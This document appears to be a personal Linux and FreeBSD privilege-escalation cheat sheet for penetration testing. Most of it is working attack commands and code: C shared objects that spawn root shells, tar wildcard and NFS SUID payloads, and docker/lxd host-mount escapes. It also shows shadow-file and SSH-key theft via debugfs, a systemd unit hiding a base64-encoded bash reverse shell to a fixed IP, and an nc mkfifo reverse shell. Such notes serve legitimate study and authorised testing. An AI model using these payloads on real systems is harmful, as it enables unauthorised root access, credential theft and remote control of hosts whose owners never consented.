# Permissions

- File:
	- **Read** - content of the file can be read
	- **Write** - content of the file can be modified
	- **Execute** - file can be executed
- Directory:
	- **Execute** - can access into directory, i.e. i can do `cd <folder>`
	- **Read** - content of directory can be listed
	- **Write** - files and subdirectory can be created in the directory
- Special:
	- _setuid (SUID) bit_ - file will be executed with the privileges of the file owner
	- _setgid (SGID) bit_ - when set on a file, the file will be executed with the privileges of the file's group. When set on a directory, files created within that directory will inherit the directory group.

# Tools & Resources

**Tools**:
- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [pspy](https://github.com/DominicBreuker/pspy)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

**Resources**:
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Hacktricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Sushant 747 - Linux Privilege Escalation](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)

# Techniques - MindMap

- [id](#id)
- [Kernel Exploits](#kernelexploits)
- [Weak Permissions](#WeakPermissions)
	- [shadow](#shadow)
	- [passwd](#passwd)
- [sudo](#sudo)
	- [LD Preload](#LDPreload)
	- [LD Library Path](#LDLibraryPath)
- [SUID and SGID](#SUIDandSGID)
- [cron](#cron)
	- [tar_wildcard](#tar_wildcard)
- [Service Exploits](#ServiceExploits)
- [Capabilities](#Capabilities)
- [NFS](#NFS)
- [Systemd Service](#SystemdService)
- [Python Library Hijacking](#PythonLibraryHijacking)
- [Enumeration](#Enumeration)
- [Groups](#Groups)
	- [docker](#docker)
	- [lxd](#lxd)
	- [fail2ban](#fail2ban)
	- [disk](#disk)
- [TIPS](#TIPS)
	- [TTY](#TTY)
	- [rootbash](#rootbash)
	- [note](#note)
	- [bypass rshell](#bypass_rshell)
	- [FreeBSD](#FreeBSD)

## id

**First command to execute: `id`**

- user and membership groups: `id`
- users with login: `cat /etc/passwd | grep -v -e nologin`
- root users: `cat /etc/group | grep sudo`

## KernelExploits

**Enumeration kernel version and OS**:
- `uname -a`
- `cat /proc/version`
- `cat /etc/*release`
- `cat /etc/issue`
- `sudo -V`

*Kernel Exploit Repository*: [https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits](https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits)

**Vulnerable version**:
- Linux Kernel > 5.8 (fino a 5.10.101, 5.15.24 o 5.16.10) - CVE-2022-0847 (DirtyPipe):
	- *patched* in Linux 5.10.102, 5.15.25 e 5.16.11
	- checker - [https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker](https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker)
	- exploit - [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- Pwnkit -  CVE-2021-4034:
	- `apt-cache policy policykit-1` - version check
	- present in numerous Linux distros such as Ubuntu, Debian, Fedora and CentOS
	- exploit: [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit), https://github.com/joeammond/CVE-2021-4034
	- **rule of thumb**: if "pkexec" is present, you could try exploit
- CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) - [Credit](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
	- "sudo" - vulnerable versions
		- *legacy* versions from 1.8.2 to 1.8.31p2
		- stable versions from 1.9.0 to 1.9.5p1
		- versions before 1.8.2 aren't vulnerable
	- checker
		- executing `sudoedit -s /` as a non-privileged user
			- vulnerable system, it responds with an error starting with "sudoedit:"
			- patched system, it responds with an error starting with "usage:"
		- running `` sudoedit -s '\' `perl -e 'print "A" x 65536'`` from a non-privileged user: "*Segmentation fault*" or "*malloc(): corrupted top size*" indicates a [vulnerable system](https://www.anvilogic.com/learn/detecting-baron-samedit-exploitation)
	- exploit: [https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
- polkit < 0.119 - CVE-2021-3560 - [https://github.com/Almorabea/Polkit-exploit](https://github.com/Almorabea/Polkit-exploit)
- CVE-2019-14287: sudo bypass
	1. `sudo --version`. required: < 1.8.28
	2. `sudo -l`. required: something like `(ALL, !root) NOPASSWD: /bin/bash`
- CVE-2019-18634
	1. `sudo --version`. required: < 1.8.26
	2. `sudo <command>`. required: asterisks hiding the password characters
- Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - [https://www.exploit-db.com/exploits/40049](https://www.exploit-db.com/exploits/40049)
- Dirty Cow:
	- **exploit**: [https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)
	- Linux Kernel 2.6.22 < 3.9 - CVE-2016-5195 (DirtyCow) - reliable
	- Linux Kernel < 4.8.3 (not tested)

## WeakPermissions

## shadow

- `ls -l /etc/shadow`
- default permissions: 640
- **readable**
	- `cut -d: -f2 /etc/shadow` and the output is saved in a file
	- `grep ENCRYPT_METHOD /etc/login.defs` to identify *ENCRYPT_METHOD*
	- `hashcat -h | grep -i <ENCRYPT_METHOD>` to identify *hashcat mode*
	- `hashcat -m <MODE> <hash file> <wordlist>`
- **writeable**
	- modify user's password with another that has a known hash: `mkpasswd -m sha-512 <clear text password>`

## passwd

- `ls -l /etc/passwd`
- default permissions: 644
- **writeable**
	- `/etc/passwd` takes precedence over `/etc/shadow` so we can substitute second field `x` with the hash of a known password generated by `openssl passwd <cleapwd>`
- **appendable**
	- is is allowed to have different users with the same UID (0, is the root one) so we proceed as in the *writable* case

# sudo

- `sudo -l`: programmes list that current user can run with `sudo`
- shell escape sequences: [GTFOBins](https://gtfobins.github.io/)
- abuse of *unintended* functionalities (esempio: lettura file tramite *apache2*)
- environment variables:
	- `env_reset`: binaries executed with `sudo` will be executed in new, minimal environment
	- `env_keep`: keeps certain user environment variables
		- `LD_PRELOAD`: if allowed, it can be used to escalate privileges with *shared object injection*
		- `LD_LIBRARY_PATH`: if allowed, it can be used to escalate privileges with *shared object* used by binary that i can execute with `sudo`

## LDPreload

Source code (*preload.so*):

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  

void _init() {  
	unsetenv("LD_PRELOAD");  
	setresuid(0,0,0);  
	system("/bin/bash -p");  
}
```

Compiling *shared object*:

```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Run:

```shell
sudo LD_PRELOAD=/tmp/preload.so <SUDO BINARY>
```

### LDLibraryPath

`LD_LIBRARY_PATH` environment variable specify a set of directories where *shared libraries* are searched first.

`ldd` can be used to identify the *shared libraries* used by a binary:
```shell
ldd <SUDO BINARY>
```

By creating a *shared library* with the same name as one used by a programme and setting `LD_LIBRARY_PATH` with its parent folder, the programme will load our *shared library* into memory.

*shared objects* used by *apache2*:
```shell
ldd /usr/sbin/apache2  
	linux-vdso.so.1 => (0x00007fff063ff000)  
	...  
	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)  
	libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)  
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)  
	/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```

We choose a *shared object*, such as *libcrypt.so.1*.

Source (*library_path.c*):

```c
#include <stdio.h>  
#include <stdlib.h>  

static void hijack() __attribute__((constructor));  

void hijack() {  
	unsetenv("LD_LIBRARY_PATH");  
	setresuid(0,0,0);  
	system("/bin/bash -p");  
}
```

Compiling *shared object*:

```shell
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

Execute:

```shell
sudo LD_LIBRARY_PATH=. apache2
```

# SUIDandSGID

- enumeration: 
	- (*basic*) `find / -type f -perm /u=s,g=s -exec ls -l {} \; 2>/dev/null`
	- (*GTFOBins like*) `find / -type f -perm /u=s,g=s -exec ls -l {} \; 2>/dev/null | sed "s/.*\///" | sort`
- **NB**: `LD_PRELOAD` and `LD_LIBRARY_PATH` are disabled when a binary SUID is executed
- common attacks:
	- shell escape sequences: *[-> GTFOBins](https://gtfobins.github.io/)*
	- *[shared object injection](#SharedObjectionInjetion)*: check whether there are *shared objects* that are not correctly loaded
	- *[binary hijacking](#binaryhijacking)*
	- [abusing shell features](#abusingshellfeatures)
	- known exploits
- **check whether unknown binary SUID/SGIDs are present**

## SharedObjectionInjection

Steps:
1. check if there are any *shared objects* that are not properly loaded:
	- `strace <suid file> 2>/dev/null | grep -iE "open|access|no such file"`
2. check if we have write permission in the directories that programme tries to open such *shared object* 
3. you can use the following C source code:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
4. source code compiling:
	- `gcc -o <SO used by SUID binary> -shared -fPIC source.c`
5. execute binary:
	- `<binary SUID>`

## binaryhijacking

**Use cases**:
- SUID binary uses a binary by specifying only its name rather than the absolute path - **case 1**
- SUID binary uses a binary, specified with absolute path, but of which we have full privileges - **case 2**

**How can be detected?**
- after execution we get an error, fo example `sh: 1: <binary>: not found`
- `strings <SUID binary>`
- `strace -v -f -e execve <SUID binary> 2>/dev/null | grep exec`

Steps (case 1):
1. `echo "/bin/sh" > <BINARY_NAME_USED_BY_SUID_BINARY>`
2. `chmod +x <BINARY_NAME_USED_BY_SUID_BINARY>`
3. `export PATH=$(pwd):$PATH`
4. `<SUID BINARY EXECUTION>`

## abusingshellfeatures

### abusing shell features #1

Requirements:
- bash < 4.2-048
- you can define user function with an absolute filename

Steps:
1. check bash version: `bash --version`
2. identify if there are some *service* used by SUID binary: `strings <SUID binary>`
3. create a function: `function <PROGRAM> { /bin/bash -p; }`
4. function export: `export –f <PROGRAM>`
5. execute SUID binary

Example: [https://rioasmara.com/2021/02/01/linux-privilege-escalation-abusing-shell-features/](https://rioasmara.com/2021/02/01/linux-privilege-escalation-abusing-shell-features/)

### abusing shell features #2

Requirement:
- bash < 4.4

Steps:
1. check bash version: `bash --version`
2. identify if there are some binary that are using *system* function: `strings <SUID binary>`
3. exploit: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' <SUID binary>`
4. `/tmp/rootbash -p`

# cron

**Enumeration**:
- system cron:
	- `cat /etc/crontab`
	- `cat /etc/cron.d/*`
- current user cron:
	- `crontab -l`
	- `sudo crontab -l`
	- `cat /var/spool/cron/crontabs/<username> /var/spool/cron/<username>`
- to check:
	- `ls -al /etc/cron* /etc/at*`
	- `cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"`
- `/var/log/syslog` contains info related to cron activities: `grep -i cron /var/log/syslog`

**Misc cron**:
- *cron file permessions*
    - _Can be edited the file executed by cron?_
    - _Does the script in the cron execute other binary or script? Can they be modified?_
- *writable PATH folder* + *no absolute filename*
    - if script/binary cron jobs do not use an absolute path and one of the directories defined in `PATH` are writable by our user then we can create a program/script with the same name as the one defined in the cron job
- *wildcards and filenames*
    - check whether `*` is used as part of a command argument as the shell will first do a _filename expansion_ operation on the wildcard; if so, generate filenames that allow shell escape sequences with the help of _GTFOBins_
- *writable LD_LIBRARY_PATH folder* + *missing shared object* (*shared object injection*)
	- if script/binary cron job uses a non-existent *shared object* and one of the directories defined in `LD_LIBRARY_PATH` is writable by our user then we can create a program/script with the same name as the one used by the cron job. Same thing if *shared object* exists, but the writable directory in `LD_LIBRARY_PATH` has priority over the one used by the binary

## tar_wildcard

The guide applies to the 'tar' binary. Similar vulnerability also applies in the case of '7z' and '7za' (*arbitrary file read*).

Assume we have a cronjob like this:

```txt
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

Let us enter into target folder:

```shell
$ cd /home/andre/backup/
```

First we create a file called `exploit.sh`. This is its content:

```shell
#!/bin/bash
cp $(which bash) /tmp/rootbash
chmod 4777 /tmp/rootbash
```

We give the script the necessary permissions to be executed:

```shell
$ chmod +x exploit.sh
```

We create the payload that will give us a root shell with SUID set:

```shell
$ echo "" > "--checkpoint=1"
$ echo "" > "--checkpoint-action=exec=sh exploit.sh"
```

In `/tmp` we will find the rootbash.

Sometimes the rootbash generation did not work for me. Alternatively (*/bin/bash* with SUID):

```shell
echo '#/!bin/bash' > /var/www/html/shell.sh && echo 'chmod +s /bin/bash' >> /var/www/html/shell.sh && chmod +x /var/www/html/shell.sh && echo "" > "--checkpoint-action=exec=sh shell.sh" && echo "" > --checkpoint=1
```

# ServiceExploits

- running processes from *root*: `ps aux | grep '^root'`
- use `pspy`
	- if a binary/executable run from *root* is to be replaced with a custom one, remember to assign all permissions to the latter  (`chmod 777 <binary>`)
- services listening only on *localhost*:
	- `ss -nap` (all connections)
	- `ss -ntlp` (only TCP and only listening)
	- `netstat -ano`
- service version enumeration:
	- ***verify the privileges of running programmes***
	- `<program> --version`
	- `<program> -v`
	- `dpkg -l | grep <program>`
	- `rpm -qa | grep <program>`

# Capabilities

- enumeration:
	- check if `getcap` is installed with `which getcap` (with `2>/dev/null` you might not see any errors)
	- `getcap -r / 2>/dev/null`
- dangerous capabilities: 
	- `CAP_CHOWN`
	- `CAP_DAC_OVERRIDE`
	- `CAP_DAC_READ_SEARCH`
	- `CAP_SETUID` - very "serious"
	- `CAP_SETGID` - very "serious"
	- `CAP_NET_RAW`
	- `CAP_SYS_ADMIN`
	- `CAP_SYS_PTRACE`
	- `CAP_SYS_MODULE`
	- `CAP_FORMER`
	- `CAP_SETFCAP`

# NFS

Steps:
1. enumeration NFS share:  `cat /etc/exports`. Identify those that have the `no_root_squash` option enabled
2. verify that the share can be accessed by attacker: `showmount -e <target>`
3. exploit: two options

Exploit 1:

```c
int main() {
	setresuid(0,0,0);
	setresgid(0,0,0);
	system("/bin/bash");
	}
```

```shell
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -o rw,vers=2 -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHARED_FOLDER>
./payload #ROOT shell
```

Exploit 2:

```shell
#Attacker, as root user
mkdir /tmp/pe
mount -o rw,vers=2 -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHARED_FOLDER>
./bash -p #ROOT shell
```

# SystemdService

## WritableSystemdService

Steps:
1. identify services we have allowed in writing:
	- *linpeas*
	- `ls -la /etc/systemd/system/ /usr/lib/systemd/system/ /run/systemd/system/`
2. verify that you have the privilege to restart the service:
	- Can I run *systemctl* with root? (SUID, *sudo -l*, ecc)
	- Can i reboot the machine? (*reboot* binary with SUID or *sudo -l*, ecc)
3. edit the service. For example

```service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
ExecStartPost=/usr/bin/bash -c 'echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyMi84MCAwPiYx|base64 -d|/usr/bin/bash'
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

4. (optional) activate netcat listener
5. restart the service or the machine

## ServiceBinaryHijacking

**Use case**: a *service unit file* executes a binary with no absolute path and has write permission in one of the PATH directories that take precedence over the directory in which the original binary is located.

Steps:
1. identify service executing binary without absolute path
2. locate PATH directories in which we have write permission and which take precedence over the original binary
3. verify that you have the privilege to restart the service:
	- Can I run *systemctl* with root? (SUID, *sudo -l*, ecc)
	- Can i reboot the machine? (*reboot* binary with SUID or *sudo -l*, ecc)
4. I generate malicious binary: I call it by the same name as the one used by the *service unit file* and place it in one of the PATH directories that takes precedence
5. (optional) activate netcat listener
6. restart the service or the machine

# PythonLibraryHijacking

**Use case**: we can run a Python script with root that attempts to import a library that does not exist. **Alternative use case**: Python module exists, but we have write privilege on it.

Steps:
1. we locate the Python script that we can run as root. We execute it and locate the library it is attempting to import
2. check that we have write permission in the same directory where the vulnerable Python script is located
3. we write the library that will be imported by the script

```shell
$ echo 'import os' >> <modulename>.py
$ echo 'os.system("whoami")' >> <modulename>.py
$ echo 'os.system("cp /usr/bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash")' >> <modulename>.py
```

# Enumeration

- enumerate ALL files found in the current users's "home" directory
- writing privilege
	- directories
		- `find / -writable -type d 2>/dev/null`
	- files owned by *root*
		- `find / -type f -user root -writable -exec ls -l {} \; 2>/dev/null | grep -v -e proc -e sys`
- file into "home" directories
	- *history*
		- `find / -iname '*histor*' -exec ls -l {} \; 2>/dev/null`
	- *.bashrc*
		- `find / -name '.bashrc' -exec ls -l {} \; 2>/dev/null`
		- `find / -name '.bashrc' -exec grep -i export {} \; 2>/dev/null`
- backups and configurations
	- `find / -name "*backup*" -exec ls -l {} \; 2>/dev/null`
	- `find / -name "*.bak*" -exec ls -l {} \; 2>/dev/null`
	- `find / -name "*.old" -exec ls -l {} \; 2>/dev/null`
	- `find / -name "*.conf" -exec ls -l {} \; 2>/dev/null`
- directory
	- *.ssh*
		- `find / -name ".ssh" -type d -exec ls -l {} \; 2>/dev/null`
		- private key: `find / -name id_rsa -exec ls -l {} \; 2>/dev/null`
		- `authorized_keys` writable: `find / -name authorized_keys  -exec ls -l {} \; 2>/dev/null`
	- *.git*
		- `find / -name '.git' -type d 2>/dev/null`
	- *opt*
		- `ls -la /opt`
	- various (backup file, users mail, *root* files):
		- `ls -la /tmp /var/tmp /dev/shm /var/backups /var/mail/ /var/spool/mail/ /root 2>/dev/null`
- searching `password=` into all files:
	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
- groups:
	- identify *sudoer* users
	- `cat /etc/group`
- *iptables*:
	- `ls -l /etc/iptables`
	- `cat /etc/iptables/rules.v4`
- disk and filesystem:
	- drives mounted at *boot time*: `cat /etc/fstab`
	- mounted filesystem: `mount`
	- disks and partitions: `lsblk`
	- kernel modules: `lsmod`
- network information:
	- `ip a` or `ifconfig`
	- `route` or `routel`
- environment variables:
	- `env` e/o `printenv`
- *concept takeaways*:
	- verify the privileges of running apps. Webapps or databases executed by privileged users are 'easy' vectors of *privesc*.
# Groups

## docker

Steps:
1. (optional, list of available docker images) `docker images`
2. `docker run -v /:/mnt --entrypoint /bin/bash --rm -it <any available online (alpine)/offline images>`

## lxd

Steps:
- *attacker*:
	- `git clone https://github.com/saghul/lxd-alpine-builder.git`
	- `cd lxd-alpine-builder`
	- `sudo ./build-alpine`
	- `python -m http.server`
- *victim*:
	- `wget <IP ATTACKER>:<PORT HTTP SERVER> <file tar.gz>`
	- `lxc image import ./alpine-v3.17-x86_64-20230407_1145.tar.gz --alias myimage`
	- `lxc image list`
	- `lxd init`
	- `lxc init myimage ignite -c security.privileged=true`
	- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
	- `lxc start ignite`
	- `lxc exec ignite /bin/sh`
	- filesystem host system is available in `/mnt/root/`

## fail2ban

Resources:
- [https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)
- [https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

Requirements:
- user member of *fail2ban* group: `id`
- write permission in the folder `/etc/fail2ban/action.d`: `ls -la /etc/fail2ban/action.d`
- Steps:
	1. `cd /etc/fail2ban/action.d/`
	2. `cp iptables-multiport.conf iptables-multiport.conf.bak`
	3. editing file `/etc/fail2ban/action.d/iptables-multiport.conf`:  `actionban = <PAYLOAD>`
	4. check configuration `/etc/fail2ban/jail.conf`: `maxentry` indicates the maximum number of attempts before being banned; if a service does not have this option, refer to the one in the *Default* section
	5. making access attempts to get banned (e.g. SSH)

## disk

Resources:
- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)

- Steps:
	1. locate where the FS root is mounted with: `df -h`
	2. filesystem access: `debugfs /dev/<sdaX>`
	3. abuse
		- `debugfs: ls -la /root`
		- `debugfs: cat /root/.ssh/id_rsa`
		- `debugfs: cat /etc/shadow`
		- write permission in *root* directory
		- **NB**: files owned by *root* cannot be overwritten. You will get the error "**Permission denied**"

# TIPS

## TTY

*check if is TTY shell*: `tty`

Python TTY: 
- `python -c 'import pty; pty.spawn("/bin/bash")'`

*S1REN TTY*:
- `python -c 'import pty; pty.spawn("/bin/bash")'` o `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp`
- `export TERM=xterm-256color`
- `alias ll='ls -lsaht --color=auto'`
- Ctrl + Z (*Background Process*)
- `stty raw -echo ; fg ; reset`
- `stty columns 200 rows 200`

## rootbash

```sh
#!/bin/bash
cp /usr/bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
```

***NB***: run *rootshell* with `/tmp/rootbash -p`.

## note

- verify password re-use
- beware of weak passwords
- example of "grep" with "context": `pkg info -all | grep -B 10 -A 10 -i sendmail`

## bypass_rshell

### find

```shell
$ touch test
$ find . -name test -exec /bin/bash \;
```

### vi

```shell
$ vi
[...]
:set shell=/bin/bash
:shell
```

## FreeBSD

- enumeration kernel and OS version:
	- `uname -a`
	- `cat /etc/*release`
	- `cat /etc/issue`
- "*shadow*"
	- default permissions: 640
	- `ls -la /etc/master.passwd`
- *passwd*
	- default permissions: 644
	- identify privileged users
	- `ls -la /etc/passwd`
- *doas*
	- identify "doas.conf" file:
		- `find / -name doas.conf 2>/dev/null`
	- `type /path/to/doas.conf` - identify commands that can be executed as *root* ([https://man.openbsd.org/doas.conf](https://man.openbsd.org/doas.conf), [other good source](https://www.openbsdhandbook.com/system_management/privileges/))
	- to execute privileged command: `doas -u root <command> <arg>`
- *SUID binaries*
	- `find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null`
	- `find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null | sed "s/.*\///" | sort`
- *cron*
	- `cat /etc/crontab`
	- `cat /etc/cron.d/*`
	- `crontab -l`
- listening service
	- `sockstat -l`
- *root* running process
	- `ps aux | grep '^root'`
- *capabilities*
	- `getcap -r / 2>/dev/null`
- installed programmes
	- `pkg info –all`
	- `pkg info –list-file <package>`
- *OpenBSD reverse shell*
	- `rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc $HOST $PORT >/tmp/f`